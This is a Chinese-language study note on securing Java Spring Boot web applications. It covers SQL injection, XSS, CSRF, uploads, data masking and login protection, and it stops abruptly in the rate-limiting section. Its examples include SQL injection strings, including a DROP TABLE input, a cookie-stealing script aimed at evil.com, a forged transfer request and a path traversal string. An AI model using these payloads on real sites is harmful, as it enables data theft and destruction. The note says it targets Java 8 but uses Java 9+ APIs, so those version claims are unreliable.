

> Web 安全是后端开发的重中之重，一个漏洞可能导致数据泄露、系统瘫痪甚至法律风险
> 本笔记基于 Java 8 + Spring Boot 2.7.18，涵盖常见攻击防护、安全编码及最佳实践

---

## 目录

1. [安全基础概念](#1-安全基础概念)
2. [SQL 注入防护](#2-sql-注入防护)
3. [XSS 跨站脚本攻击](#3-xss-跨站脚本攻击)
4. [CSRF 跨站请求伪造](#4-csrf-跨站请求伪造)
5. [文件上传安全](#5-文件上传安全)
6. [敏感数据保护](#6-敏感数据保护)
7. [认证安全](#7-认证安全)
8. [接口安全](#8-接口安全)
9. [日志与审计](#9-日志与审计)
10. [依赖安全](#10-依赖安全)
11. [安全响应头](#11-安全响应头)
12. [常见错误与解决方案](#12-常见错误与解决方案)
13. [安全检查清单](#13-安全检查清单)

---

## 1. 安全基础概念

### 1.1 为什么安全很重要？

安全漏洞的后果：
- **数据泄露**：用户隐私、商业机密外泄
- **财产损失**：资金被盗、业务中断
- **法律风险**：违反 GDPR、网络安全法
- **声誉损害**：用户信任丧失

**真实案例**：
```
2017 年 Equifax 数据泄露：1.47 亿用户信息泄露
原因：未修复已知的 Apache Struts 漏洞
损失：超过 7 亿美元赔偿
```

### 1.2 OWASP Top 10（2021）

```
┌─────────────────────────────────────────────────────────────┐
│                    OWASP Top 10 2021                        │
├─────────────────────────────────────────────────────────────┤
│  A01 - 失效的访问控制（Broken Access Control）              │
│  A02 - 加密机制失效（Cryptographic Failures）               │
│  A03 - 注入（Injection）                                    │
│  A04 - 不安全设计（Insecure Design）                        │
│  A05 - 安全配置错误（Security Misconfiguration）            │
│  A06 - 自带缺陷和过时的组件（Vulnerable Components）        │
│  A07 - 身份识别和认证失败（Authentication Failures）        │
│  A08 - 软件和数据完整性故障（Integrity Failures）           │
│  A09 - 安全日志和监控失败（Logging Failures）               │
│  A10 - 服务端请求伪造（SSRF）                               │
└─────────────────────────────────────────────────────────────┘
```

### 1.3 安全原则

```
1. 最小权限原则
   - 只授予完成任务所需的最小权限
   - 默认拒绝，显式授权

2. 纵深防御原则
   - 多层防护，不依赖单一措施
   - 即使一层被突破，还有其他防线

3. 安全默认原则
   - 默认配置应该是安全的
   - 用户需要显式开启不安全功能

4. 不信任原则
   - 不信任任何外部输入
   - 所有输入都需要验证

5. 失败安全原则
   - 出错时应该安全地失败
   - 不泄露敏感信息
```

---

## 2. SQL 注入防护

### 2.1 什么是 SQL 注入？

SQL 注入是将恶意 SQL 代码插入到查询中，从而操纵数据库。

```java
// 危险代码示例
String sql = "SELECT * FROM users WHERE username = '" + username + "'";

// 攻击者输入：' OR '1'='1
// 实际执行：SELECT * FROM users WHERE username = '' OR '1'='1'
// 结果：返回所有用户！

// 更危险的攻击：'; DROP TABLE users; --
// 实际执行：SELECT * FROM users WHERE username = ''; DROP TABLE users; --'
// 结果：删除整个用户表！
```

### 2.2 使用参数化查询（PreparedStatement）

```java
// 正确做法：使用 PreparedStatement
public User findByUsername(String username) {
    String sql = "SELECT * FROM users WHERE username = ?";
    try (Connection conn = dataSource.getConnection();
         PreparedStatement stmt = conn.prepareStatement(sql)) {
        stmt.setString(1, username);  // 参数化，自动转义
        ResultSet rs = stmt.executeQuery();
        // 处理结果
    }
}
```

### 2.3 使用 JPA/Hibernate

```java
// JPA 查询（安全）
@Repository
public interface UserRepository extends JpaRepository<User, Long> {
    
    // 方法名查询（安全）
    User findByUsername(String username);
    
    // JPQL 参数化查询（安全）
    @Query("SELECT u FROM User u WHERE u.username = :username")
    User findByUsernameJpql(@Param("username") String username);
    
    // 原生 SQL 参数化查询（安全）
    @Query(value = "SELECT * FROM users WHERE username = ?1", nativeQuery = true)
    User findByUsernameNative(String username);
}

// 危险：字符串拼接 JPQL
@Query("SELECT u FROM User u WHERE u.username = '" + username + "'")  // 危险！
```

### 2.4 使用 MyBatis

```xml
<!-- 安全：使用 #{} 参数化 -->
<select id="findByUsername" resultType="User">
    SELECT * FROM users WHERE username = #{username}
</select>

<!-- 危险：使用 ${} 字符串拼接 -->
<select id="findByUsername" resultType="User">
    SELECT * FROM users WHERE username = '${username}'  <!-- 危险！ -->
</select>

<!-- ${} 的正确使用场景：动态表名、列名（需要白名单验证） -->
<select id="findAll" resultType="User">
    SELECT * FROM users ORDER BY ${orderColumn}
</select>
```

```java
// MyBatis 动态列名的安全处理
public List<User> findAll(String orderColumn) {
    // 白名单验证
    Set<String> allowedColumns = Set.of("id", "username", "created_at");
    if (!allowedColumns.contains(orderColumn)) {
        throw new IllegalArgumentException("非法排序列");
    }
    return userMapper.findAll(orderColumn);
}
```

### 2.5 输入验证

```java
@RestController
public class UserController {

    @GetMapping("/users")
    public List<User> search(
            @RequestParam @Pattern(regexp = "^[a-zA-Z0-9_]{1,50}$") String username) {
        // 正则验证用户名格式
        return userService.search(username);
    }
}

// 自定义验证器
public class SqlInjectionValidator {
    
    private static final Pattern SQL_INJECTION_PATTERN = Pattern.compile(
        "('.+--)|(--)|(\\|)|(%7C)|;|/\\*|\\*/|@@|@|" +
        "char|nchar|varchar|nvarchar|alter|begin|cast|create|cursor|" +
        "declare|delete|drop|end|exec|execute|fetch|insert|kill|" +
        "select|sys|sysobjects|syscolumns|table|update",
        Pattern.CASE_INSENSITIVE
    );
    
    public static boolean containsSqlInjection(String input) {
        if (input == null) return false;
        return SQL_INJECTION_PATTERN.matcher(input).find();
    }
}
```


---

## 3. XSS 跨站脚本攻击

### 3.1 什么是 XSS？

XSS（Cross-Site Scripting）是将恶意脚本注入到网页中，在用户浏览器执行。

```
三种类型：

1. 反射型 XSS
   攻击代码在 URL 中，服务器"反射"回页面
   示例：http://example.com/search?q=<script>alert('XSS')</script>

2. 存储型 XSS
   攻击代码存储在数据库，每次访问都执行
   示例：评论区提交 <script>document.location='http://evil.com?c='+document.cookie</script>

3. DOM 型 XSS
   攻击代码通过 DOM 操作执行，不经过服务器
   示例：document.write(location.hash.substring(1))
```

### 3.2 输出编码

```java
// 使用 OWASP Java Encoder
import org.owasp.encoder.Encode;

@Service
public class SafeOutputService {

    // HTML 上下文编码
    public String encodeForHtml(String input) {
        return Encode.forHtml(input);
        // <script> → &lt;script&gt;
    }

    // HTML 属性编码
    public String encodeForHtmlAttribute(String input) {
        return Encode.forHtmlAttribute(input);
    }

    // JavaScript 上下文编码
    public String encodeForJavaScript(String input) {
        return Encode.forJavaScript(input);
    }

    // URL 参数编码
    public String encodeForUrl(String input) {
        return Encode.forUriComponent(input);
    }

    // CSS 上下文编码
    public String encodeForCss(String input) {
        return Encode.forCssString(input);
    }
}
```

```xml
<!-- pom.xml -->
<dependency>
    <groupId>org.owasp.encoder</groupId>
    <artifactId>encoder</artifactId>
    <version>1.2.3</version>
</dependency>
```

### 3.3 Thymeleaf 自动转义

```html
<!-- Thymeleaf 默认转义（安全） -->
<p th:text="${userInput}"></p>
<!-- 输入 <script>alert('XSS')</script> -->
<!-- 输出 &lt;script&gt;alert('XSS')&lt;/script&gt; -->

<!-- 危险：禁用转义 -->
<p th:utext="${userInput}"></p>  <!-- 不转义，危险！ -->

<!-- 如果必须输出 HTML，先清理 -->
<p th:utext="${@htmlSanitizer.sanitize(userInput)}"></p>
```

### 3.4 HTML 清理（允许部分标签）

```java
import org.jsoup.Jsoup;
import org.jsoup.safety.Safelist;

@Component
public class HtmlSanitizer {

    // 只允许基本格式标签
    public String sanitize(String html) {
        if (html == null) return null;
        return Jsoup.clean(html, Safelist.basic());
        // 允许：a, b, blockquote, br, cite, code, dd, dl, dt, em, i, li, ol, p, pre, q, small, span, strike, strong, sub, sup, u, ul
    }

    // 只允许文本，移除所有标签
    public String sanitizeToText(String html) {
        if (html == null) return null;
        return Jsoup.clean(html, Safelist.none());
    }

    // 自定义白名单
    public String sanitizeCustom(String html) {
        Safelist safelist = Safelist.basic()
            .addTags("img")
            .addAttributes("img", "src", "alt")
            .addProtocols("img", "src", "https");  // 只允许 https 图片
        return Jsoup.clean(html, safelist);
    }
}
```

### 3.5 Content Security Policy（CSP）

```java
@Configuration
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.headers()
            .contentSecurityPolicy(
                "default-src 'self'; " +
                "script-src 'self' https://cdn.example.com; " +
                "style-src 'self' 'unsafe-inline'; " +
                "img-src 'self' data: https:; " +
                "font-src 'self'; " +
                "connect-src 'self' https://api.example.com; " +
                "frame-ancestors 'none'; " +
                "form-action 'self'"
            );
        return http.build();
    }
}
```

### 3.6 HttpOnly Cookie

```java
@Configuration
public class CookieConfig {

    @Bean
    public CookieSerializer cookieSerializer() {
        DefaultCookieSerializer serializer = new DefaultCookieSerializer();
        serializer.setCookieName("SESSION");
        serializer.setUseHttpOnlyCookie(true);   // 防止 JS 访问
        serializer.setUseSecureCookie(true);     // 仅 HTTPS 传输
        serializer.setSameSite("Strict");        // 防止 CSRF
        return serializer;
    }
}

// 手动设置 Cookie
@GetMapping("/set-cookie")
public void setCookie(HttpServletResponse response) {
    Cookie cookie = new Cookie("token", "value");
    cookie.setHttpOnly(true);
    cookie.setSecure(true);
    cookie.setPath("/");
    cookie.setMaxAge(3600);
    response.addCookie(cookie);
}
```

---

## 4. CSRF 跨站请求伪造

### 4.1 什么是 CSRF？

CSRF（Cross-Site Request Forgery）是攻击者诱导用户在已登录的网站上执行非预期操作。

```
攻击流程：
1. 用户登录银行网站 bank.com，获得 Cookie
2. 用户访问恶意网站 evil.com
3. evil.com 页面包含：<img src="http://bank.com/transfer?to=attacker&amount=10000">
4. 浏览器自动携带 bank.com 的 Cookie 发送请求
5. 银行服务器认为是合法请求，执行转账
```

### 4.2 Spring Security CSRF 防护

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            // 启用 CSRF（默认启用）
            .csrf()
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
            .and()
            // 其他配置...
            ;
        return http.build();
    }
}
```

### 4.3 前端携带 CSRF Token

```html
<!-- Thymeleaf 表单自动添加 -->
<form th:action="@{/transfer}" method="post">
    <!-- 自动添加 <input type="hidden" name="_csrf" value="..."/> -->
    <input type="text" name="amount"/>
    <button type="submit">转账</button>
</form>

<!-- 手动添加 -->
<form action="/transfer" method="post">
    <input type="hidden" name="_csrf" th:value="${_csrf.token}"/>
    <input type="text" name="amount"/>
    <button type="submit">转账</button>
</form>
```

```javascript
// AJAX 请求携带 CSRF Token
// 从 Cookie 获取
function getCsrfToken() {
    const name = 'XSRF-TOKEN=';
    const cookies = document.cookie.split(';');
    for (let cookie of cookies) {
        cookie = cookie.trim();
        if (cookie.startsWith(name)) {
            return cookie.substring(name.length);
        }
    }
    return null;
}

// 发送请求
fetch('/api/transfer', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-XSRF-TOKEN': getCsrfToken()
    },
    body: JSON.stringify({ amount: 100 })
});

// Axios 全局配置
axios.defaults.xsrfCookieName = 'XSRF-TOKEN';
axios.defaults.xsrfHeaderName = 'X-XSRF-TOKEN';
```

### 4.4 前后端分离的 CSRF 防护

```java
// 方案1：使用 Cookie + Header 双重验证
@Configuration
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.csrf()
            .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
            .ignoringAntMatchers("/api/public/**");  // 公开接口不需要 CSRF
        return http.build();
    }
}

// 方案2：使用 JWT（无状态，天然防 CSRF）
// JWT 存储在 localStorage，不会自动携带
// 需要手动添加到 Authorization 头

// 方案3：SameSite Cookie
@Bean
public CookieSerializer cookieSerializer() {
    DefaultCookieSerializer serializer = new DefaultCookieSerializer();
    serializer.setSameSite("Strict");  // 或 "Lax"
    return serializer;
}
```

### 4.5 其他 CSRF 防护措施

```java
// 1. 验证 Referer/Origin 头
@Component
public class RefererCheckFilter extends OncePerRequestFilter {

    private static final Set<String> ALLOWED_ORIGINS = Set.of(
        "https://example.com",
        "https://www.example.com"
    );

    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                    HttpServletResponse response,
                                    FilterChain chain) throws ServletException, IOException {
        if ("POST".equals(request.getMethod())) {
            String origin = request.getHeader("Origin");
            String referer = request.getHeader("Referer");
            
            if (origin != null && !ALLOWED_ORIGINS.contains(origin)) {
                response.sendError(HttpServletResponse.SC_FORBIDDEN, "Invalid Origin");
                return;
            }
            // 也可以检查 Referer
        }
        chain.doFilter(request, response);
    }
}

// 2. 敏感操作二次验证
@PostMapping("/transfer")
public Result transfer(@RequestBody TransferDTO dto,
                       @RequestParam String verifyCode) {
    // 验证短信/邮箱验证码
    if (!verifyService.verify(dto.getPhone(), verifyCode)) {
        throw new BusinessException("验证码错误");
    }
    return transferService.transfer(dto);
}
```


---

## 5. 文件上传安全

### 5.1 文件上传风险

```
常见攻击方式：
1. 上传 WebShell（.jsp, .php）
2. 上传恶意脚本（.html, .svg 含 JS）
3. 路径穿越（../../../etc/passwd）
4. 文件覆盖（覆盖系统文件）
5. 拒绝服务（超大文件）
6. 恶意内容（病毒、木马）
```

### 5.2 安全的文件上传实现

```java
@RestController
@RequestMapping("/api/files")
public class FileUploadController {

    // 允许的文件类型白名单
    private static final Set<String> ALLOWED_EXTENSIONS = Set.of(
        "jpg", "jpeg", "png", "gif", "pdf", "doc", "docx"
    );
    
    private static final Set<String> ALLOWED_CONTENT_TYPES = Set.of(
        "image/jpeg", "image/png", "image/gif",
        "application/pdf",
        "application/msword",
        "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
    );
    
    private static final long MAX_FILE_SIZE = 10 * 1024 * 1024; // 10MB

    @Value("${file.upload.path}")
    private String uploadPath;

    @PostMapping("/upload")
    public Result<String> upload(@RequestParam("file") MultipartFile file) {
        // 1. 检查文件是否为空
        if (file.isEmpty()) {
            throw new BusinessException("文件不能为空");
        }

        // 2. 检查文件大小
        if (file.getSize() > MAX_FILE_SIZE) {
            throw new BusinessException("文件大小不能超过 10MB");
        }

        // 3. 获取并验证文件扩展名
        String originalFilename = file.getOriginalFilename();
        String extension = getExtension(originalFilename);
        if (!ALLOWED_EXTENSIONS.contains(extension.toLowerCase())) {
            throw new BusinessException("不支持的文件类型");
        }

        // 4. 验证 Content-Type
        String contentType = file.getContentType();
        if (!ALLOWED_CONTENT_TYPES.contains(contentType)) {
            throw new BusinessException("不支持的文件类型");
        }

        // 5. 验证文件内容（魔数检测）
        if (!isValidFileContent(file, extension)) {
            throw new BusinessException("文件内容与扩展名不匹配");
        }

        // 6. 生成安全的文件名（避免路径穿越）
        String safeFilename = generateSafeFilename(extension);

        // 7. 保存文件
        try {
            Path targetPath = Paths.get(uploadPath, safeFilename);
            // 确保目标路径在上传目录内
            if (!targetPath.normalize().startsWith(Paths.get(uploadPath).normalize())) {
                throw new BusinessException("非法文件路径");
            }
            Files.copy(file.getInputStream(), targetPath, StandardCopyOption.REPLACE_EXISTING);
            return Result.success(safeFilename);
        } catch (IOException e) {
            throw new BusinessException("文件保存失败");
        }
    }

    private String getExtension(String filename) {
        if (filename == null || !filename.contains(".")) {
            return "";
        }
        return filename.substring(filename.lastIndexOf(".") + 1);
    }

    private String generateSafeFilename(String extension) {
        // 使用 UUID 生成随机文件名
        return UUID.randomUUID().toString() + "." + extension;
    }

    private boolean isValidFileContent(MultipartFile file, String extension) {
        try {
            byte[] bytes = file.getBytes();
            // 检查文件魔数
            return checkMagicNumber(bytes, extension);
        } catch (IOException e) {
            return false;
        }
    }

    private boolean checkMagicNumber(byte[] bytes, String extension) {
        if (bytes.length < 4) return false;
        
        switch (extension.toLowerCase()) {
            case "jpg":
            case "jpeg":
                // JPEG: FF D8 FF
                return bytes[0] == (byte) 0xFF && bytes[1] == (byte) 0xD8 && bytes[2] == (byte) 0xFF;
            case "png":
                // PNG: 89 50 4E 47
                return bytes[0] == (byte) 0x89 && bytes[1] == 0x50 && bytes[2] == 0x4E && bytes[3] == 0x47;
            case "gif":
                // GIF: 47 49 46 38
                return bytes[0] == 0x47 && bytes[1] == 0x49 && bytes[2] == 0x46 && bytes[3] == 0x38;
            case "pdf":
                // PDF: 25 50 44 46 (%PDF)
                return bytes[0] == 0x25 && bytes[1] == 0x50 && bytes[2] == 0x44 && bytes[3] == 0x46;
            default:
                return true;
        }
    }
}
```

### 5.3 文件上传配置

```yaml
# application.yml
spring:
  servlet:
    multipart:
      enabled: true
      max-file-size: 10MB
      max-request-size: 50MB
      file-size-threshold: 2KB

file:
  upload:
    path: /data/uploads
```

### 5.4 文件存储安全

```java
@Configuration
public class FileStorageConfig {

    // 1. 存储在 Web 目录外
    // 不要存储在 src/main/resources/static 下！
    
    // 2. 使用独立的文件服务器或对象存储
    // 如 MinIO、阿里云 OSS、AWS S3
    
    // 3. 设置正确的文件权限
    // chmod 644 uploaded_files/*
}

// 文件下载时设置正确的响应头
@GetMapping("/download/{filename}")
public ResponseEntity<Resource> download(@PathVariable String filename) {
    // 验证文件名，防止路径穿越
    if (filename.contains("..") || filename.contains("/") || filename.contains("\\")) {
        throw new BusinessException("非法文件名");
    }
    
    Path filePath = Paths.get(uploadPath, filename);
    Resource resource = new FileSystemResource(filePath);
    
    return ResponseEntity.ok()
        .header(HttpHeaders.CONTENT_DISPOSITION, 
                "attachment; filename=\"" + filename + "\"")
        .header(HttpHeaders.CONTENT_TYPE, "application/octet-stream")
        .header("X-Content-Type-Options", "nosniff")  // 防止 MIME 嗅探
        .body(resource);
}
```

### 5.5 图片处理安全

```java
// 图片重新处理，去除潜在恶意代码
@Service
public class ImageProcessService {

    public byte[] processImage(MultipartFile file) throws IOException {
        // 读取图片
        BufferedImage image = ImageIO.read(file.getInputStream());
        if (image == null) {
            throw new BusinessException("无效的图片文件");
        }

        // 创建新图片（去除元数据和潜在恶意代码）
        BufferedImage newImage = new BufferedImage(
            image.getWidth(), 
            image.getHeight(), 
            BufferedImage.TYPE_INT_RGB
        );
        newImage.getGraphics().drawImage(image, 0, 0, null);

        // 输出为新文件
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ImageIO.write(newImage, "jpg", baos);
        return baos.toByteArray();
    }
}
```

---

## 6. 敏感数据保护

### 6.1 密码存储

```java
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.security.crypto.password.PasswordEncoder;

@Configuration
public class PasswordConfig {

    @Bean
    public PasswordEncoder passwordEncoder() {
        // BCrypt 自动加盐，强度 12
        return new BCryptPasswordEncoder(12);
    }
}

@Service
public class UserService {

    private final PasswordEncoder passwordEncoder;
    private final UserRepository userRepository;

    // 注册时加密密码
    public void register(UserDTO dto) {
        User user = new User();
        user.setUsername(dto.getUsername());
        // 加密存储，永远不要存储明文密码！
        user.setPassword(passwordEncoder.encode(dto.getPassword()));
        userRepository.save(user);
    }

    // 登录时验证密码
    public boolean login(String username, String password) {
        User user = userRepository.findByUsername(username);
        if (user == null) {
            // 防止用户枚举攻击，即使用户不存在也执行密码比较
            passwordEncoder.matches(password, "$2a$12$dummy.hash.to.prevent.timing.attack");
            return false;
        }
        return passwordEncoder.matches(password, user.getPassword());
    }
}
```

### 6.2 敏感数据加密

```java
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.security.SecureRandom;
import java.util.Base64;

@Component
public class AesEncryptor {

    private static final String ALGORITHM = "AES/GCM/NoPadding";
    private static final int GCM_IV_LENGTH = 12;
    private static final int GCM_TAG_LENGTH = 128;

    @Value("${encryption.key}")
    private String encryptionKey;  // 32 字节密钥

    public String encrypt(String plaintext) {
        try {
            byte[] iv = new byte[GCM_IV_LENGTH];
            new SecureRandom().nextBytes(iv);

            SecretKeySpec keySpec = new SecretKeySpec(
                encryptionKey.getBytes(), "AES");
            GCMParameterSpec gcmSpec = new GCMParameterSpec(GCM_TAG_LENGTH, iv);

            Cipher cipher = Cipher.getInstance(ALGORITHM);
            cipher.init(Cipher.ENCRYPT_MODE, keySpec, gcmSpec);
            byte[] ciphertext = cipher.doFinal(plaintext.getBytes());

            // IV + 密文
            byte[] result = new byte[iv.length + ciphertext.length];
            System.arraycopy(iv, 0, result, 0, iv.length);
            System.arraycopy(ciphertext, 0, result, iv.length, ciphertext.length);

            return Base64.getEncoder().encodeToString(result);
        } catch (Exception e) {
            throw new RuntimeException("加密失败", e);
        }
    }

    public String decrypt(String encrypted) {
        try {
            byte[] decoded = Base64.getDecoder().decode(encrypted);

            byte[] iv = new byte[GCM_IV_LENGTH];
            byte[] ciphertext = new byte[decoded.length - GCM_IV_LENGTH];
            System.arraycopy(decoded, 0, iv, 0, iv.length);
            System.arraycopy(decoded, iv.length, ciphertext, 0, ciphertext.length);

            SecretKeySpec keySpec = new SecretKeySpec(
                encryptionKey.getBytes(), "AES");
            GCMParameterSpec gcmSpec = new GCMParameterSpec(GCM_TAG_LENGTH, iv);

            Cipher cipher = Cipher.getInstance(ALGORITHM);
            cipher.init(Cipher.DECRYPT_MODE, keySpec, gcmSpec);
            byte[] plaintext = cipher.doFinal(ciphertext);

            return new String(plaintext);
        } catch (Exception e) {
            throw new RuntimeException("解密失败", e);
        }
    }
}
```

### 6.3 数据脱敏

```java
// 脱敏工具类
public class DesensitizeUtils {

    // 手机号脱敏：138****8888
    public static String phone(String phone) {
        if (phone == null || phone.length() != 11) return phone;
        return phone.substring(0, 3) + "****" + phone.substring(7);
    }

    // 身份证脱敏：110***********1234
    public static String idCard(String idCard) {
        if (idCard == null || idCard.length() < 8) return idCard;
        return idCard.substring(0, 3) + "***********" + idCard.substring(idCard.length() - 4);
    }

    // 邮箱脱敏：z***@example.com
    public static String email(String email) {
        if (email == null || !email.contains("@")) return email;
        int atIndex = email.indexOf("@");
        if (atIndex <= 1) return email;
        return email.charAt(0) + "***" + email.substring(atIndex);
    }

    // 银行卡脱敏：6222 **** **** 1234
    public static String bankCard(String bankCard) {
        if (bankCard == null || bankCard.length() < 8) return bankCard;
        return bankCard.substring(0, 4) + " **** **** " + bankCard.substring(bankCard.length() - 4);
    }

    // 姓名脱敏：张*
    public static String name(String name) {
        if (name == null || name.length() < 2) return name;
        return name.charAt(0) + "*".repeat(name.length() - 1);
    }
}

// Jackson 脱敏注解
@Target(ElementType.FIELD)
@Retention(RetentionPolicy.RUNTIME)
@JacksonAnnotationsInside
@JsonSerialize(using = DesensitizeSerializer.class)
public @interface Desensitize {
    DesensitizeType type();
}

public enum DesensitizeType {
    PHONE, ID_CARD, EMAIL, BANK_CARD, NAME
}

public class DesensitizeSerializer extends JsonSerializer<String> 
        implements ContextualSerializer {
    
    private DesensitizeType type;

    @Override
    public void serialize(String value, JsonGenerator gen, SerializerProvider provider) 
            throws IOException {
        String result = switch (type) {
            case PHONE -> DesensitizeUtils.phone(value);
            case ID_CARD -> DesensitizeUtils.idCard(value);
            case EMAIL -> DesensitizeUtils.email(value);
            case BANK_CARD -> DesensitizeUtils.bankCard(value);
            case NAME -> DesensitizeUtils.name(value);
        };
        gen.writeString(result);
    }

    @Override
    public JsonSerializer<?> createContextual(SerializerProvider prov, BeanProperty property) {
        Desensitize annotation = property.getAnnotation(Desensitize.class);
        if (annotation != null) {
            DesensitizeSerializer serializer = new DesensitizeSerializer();
            serializer.type = annotation.type();
            return serializer;
        }
        return this;
    }
}

// 使用
@Data
public class UserVO {
    private Long id;
    private String username;
    
    @Desensitize(type = DesensitizeType.PHONE)
    private String phone;
    
    @Desensitize(type = DesensitizeType.ID_CARD)
    private String idCard;
    
    @Desensitize(type = DesensitizeType.EMAIL)
    private String email;
}
```


### 6.4 日志脱敏

```java
// Logback 脱敏转换器
public class DesensitizeConverter extends ClassicConverter {

    private static final Pattern PHONE_PATTERN = 
        Pattern.compile("(1[3-9]\\d)\\d{4}(\\d{4})");
    private static final Pattern ID_CARD_PATTERN = 
        Pattern.compile("(\\d{3})\\d{11}(\\d{4})");
    private static final Pattern EMAIL_PATTERN = 
        Pattern.compile("(\\w)[\\w.]*@(\\w+\\.\\w+)");

    @Override
    public String convert(ILoggingEvent event) {
        String message = event.getFormattedMessage();
        message = PHONE_PATTERN.matcher(message).replaceAll("$1****$2");
        message = ID_CARD_PATTERN.matcher(message).replaceAll("$1***********$2");
        message = EMAIL_PATTERN.matcher(message).replaceAll("$1***@$2");
        return message;
    }
}

// logback-spring.xml 配置
// <conversionRule conversionWord="msg" converterClass="com.example.DesensitizeConverter"/>
```

---

## 7. 认证安全

### 7.1 密码策略

```java
@Component
public class PasswordPolicyValidator {

    private static final int MIN_LENGTH = 8;
    private static final int MAX_LENGTH = 32;

    public void validate(String password) {
        List<String> errors = new ArrayList<>();

        if (password.length() < MIN_LENGTH) {
            errors.add("密码长度至少 " + MIN_LENGTH + " 位");
        }
        if (password.length() > MAX_LENGTH) {
            errors.add("密码长度不能超过 " + MAX_LENGTH + " 位");
        }
        if (!password.matches(".*[A-Z].*")) {
            errors.add("密码必须包含大写字母");
        }
        if (!password.matches(".*[a-z].*")) {
            errors.add("密码必须包含小写字母");
        }
        if (!password.matches(".*\\d.*")) {
            errors.add("密码必须包含数字");
        }
        if (!password.matches(".*[!@#$%^&*(),.?\":{}|<>].*")) {
            errors.add("密码必须包含特殊字符");
        }
        // 检查常见弱密码
        if (isCommonPassword(password)) {
            errors.add("密码过于简单");
        }

        if (!errors.isEmpty()) {
            throw new BusinessException(String.join("; ", errors));
        }
    }

    private boolean isCommonPassword(String password) {
        Set<String> commonPasswords = Set.of(
            "password", "123456", "12345678", "qwerty", "abc123",
            "password123", "admin123", "letmein", "welcome"
        );
        return commonPasswords.contains(password.toLowerCase());
    }
}
```

### 7.2 登录安全

```java
@Service
public class LoginService {

    private final RedisTemplate<String, Object> redisTemplate;
    private final UserRepository userRepository;
    private final PasswordEncoder passwordEncoder;

    private static final int MAX_ATTEMPTS = 5;
    private static final int LOCK_MINUTES = 30;

    public LoginResult login(String username, String password, String captcha) {
        // 1. 验证验证码
        if (!verifyCaptcha(captcha)) {
            return LoginResult.fail("验证码错误");
        }

        // 2. 检查账号是否被锁定
        String lockKey = "login:lock:" + username;
        if (Boolean.TRUE.equals(redisTemplate.hasKey(lockKey))) {
            Long ttl = redisTemplate.getExpire(lockKey, TimeUnit.MINUTES);
            return LoginResult.fail("账号已锁定，请 " + ttl + " 分钟后重试");
        }

        // 3. 验证用户名密码
        User user = userRepository.findByUsername(username);
        if (user == null || !passwordEncoder.matches(password, user.getPassword())) {
            // 记录失败次数
            incrementFailCount(username);
            return LoginResult.fail("用户名或密码错误");
        }

        // 4. 检查账号状态
        if (!user.isEnabled()) {
            return LoginResult.fail("账号已禁用");
        }

        // 5. 登录成功，清除失败记录
        clearFailCount(username);

        // 6. 生成 Token
        String token = generateToken(user);
        return LoginResult.success(token);
    }

    private void incrementFailCount(String username) {
        String key = "login:fail:" + username;
        Long count = redisTemplate.opsForValue().increment(key);
        redisTemplate.expire(key, 1, TimeUnit.HOURS);

        if (count != null && count >= MAX_ATTEMPTS) {
            // 锁定账号
            String lockKey = "login:lock:" + username;
            redisTemplate.opsForValue().set(lockKey, "1", LOCK_MINUTES, TimeUnit.MINUTES);
            redisTemplate.delete(key);
        }
    }

    private void clearFailCount(String username) {
        redisTemplate.delete("login:fail:" + username);
    }
}
```

### 7.3 会话安全

```java
@Configuration
@EnableWebSecurity
public class SessionSecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .sessionManagement()
                // 会话固定攻击防护
                .sessionFixation().migrateSession()
                // 最大会话数
                .maximumSessions(1)
                // 阻止新登录（而不是踢掉旧会话）
                .maxSessionsPreventsLogin(false)
                // 会话过期处理
                .expiredSessionStrategy(event -> {
                    HttpServletResponse response = event.getResponse();
                    response.setContentType("application/json;charset=UTF-8");
                    response.getWriter().write("{\"code\":401,\"message\":\"会话已过期\"}");
                })
            .and()
            .and()
            // 会话超时
            .sessionManagement()
                .invalidSessionUrl("/login?expired");

        return http.build();
    }
}

// application.yml
server:
  servlet:
    session:
      timeout: 30m  # 会话超时时间
      cookie:
        http-only: true
        secure: true
        same-site: strict
```

### 7.4 多因素认证（MFA）

```java
// TOTP（基于时间的一次性密码）
import com.warrenstrange.googleauth.GoogleAuthenticator;
import com.warrenstrange.googleauth.GoogleAuthenticatorKey;

@Service
public class TotpService {

    private final GoogleAuthenticator gAuth = new GoogleAuthenticator();

    // 生成密钥
    public String generateSecretKey() {
        GoogleAuthenticatorKey key = gAuth.createCredentials();
        return key.getKey();
    }

    // 生成二维码 URL
    public String getQrCodeUrl(String username, String secretKey) {
        return String.format(
            "otpauth://totp/%s:%s?secret=%s&issuer=%s",
            "MyApp", username, secretKey, "MyApp"
        );
    }

    // 验证 TOTP
    public boolean verifyCode(String secretKey, int code) {
        return gAuth.authorize(secretKey, code);
    }
}

// 登录时验证
@PostMapping("/login")
public Result login(@RequestBody LoginRequest request) {
    // 1. 验证用户名密码
    User user = authService.authenticate(request.getUsername(), request.getPassword());
    
    // 2. 如果启用了 MFA，验证 TOTP
    if (user.isMfaEnabled()) {
        if (request.getTotpCode() == null) {
            return Result.needMfa();  // 需要 MFA 验证
        }
        if (!totpService.verifyCode(user.getMfaSecret(), request.getTotpCode())) {
            return Result.fail("验证码错误");
        }
    }
    
    // 3. 生成 Token
    String token = jwtService.generateToken(user);
    return Result.success(token);
}
```

---

## 8. 接口安全

### 8.1 接口限流

```java
// 使用 Guava RateLimiter
@Aspect
@Component
public class RateLimitAspect {

    private final Map<String, RateLimiter> limiters = new ConcurrentHashMap<>();

    @Around("@annotation(rateLimit)")
    public Object around(ProceedingJoinPoint point, RateLimit rateLimit) throws Throwable {
        String key = rateLimit.key();
        if (key.isEmpty()) {
            key = point.getSignature().toLongString();
        }

